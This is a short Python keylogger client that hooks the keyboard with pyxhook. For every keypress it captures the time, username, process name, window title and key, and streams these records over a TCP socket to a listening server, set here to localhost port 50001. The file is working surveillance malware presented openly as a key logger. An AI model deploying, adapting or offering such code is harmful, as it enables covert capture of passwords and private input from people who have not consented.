import pyxhook
import sys
import time
import socket
import logging
import os
import pwd
import datetime

class KeylogClient(object):

    """
    client program for key logger

    """


    def connect_to_server(self,host,port):
        self.s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            self.s.connect((host,port))
            return True

        except:
            return False

    def start(self, server_addr, port, size, retry ):
        self._running = True


        for ret in range(retry):
            connected = self.connect_to_server(server_addr,port)
            if connected==False:
                continue
            else:
                break

        #Create hookmanager
        hookman = pyxhook.HookManager()

        #Define our callback to fire when a key is pressed down
        hookman.KeyDown = self.kbevent

        #Hook the keyboard
        hookman.HookKeyboard()

        #Start our listener
        hookman.start()

        while self._running:
            time.sleep(0.1)
        #Close the listener when we are done
        hookman.cancel()



    def kbevent(self,event):


        self.data_to_send=str(datetime.datetime.now()) + '||' + pwd.getpwuid(os.getuid()).pw_name + '||' +  event.WindowProcName + '||'+ event.WindowName + '||' + event.Key

        if(len(self.data_to_send)<150):
            self.d2s="{:<150}".format(self.data_to_send)
            self.s.send(self.d2s)
        else:
            self.s.send(self.data_to_send)


def main(*argv):
    klogger = KeylogClient()
    klogger.start('localhost',50001,1024,3)

if __name__ == '__main__':
    main(sys.argv)




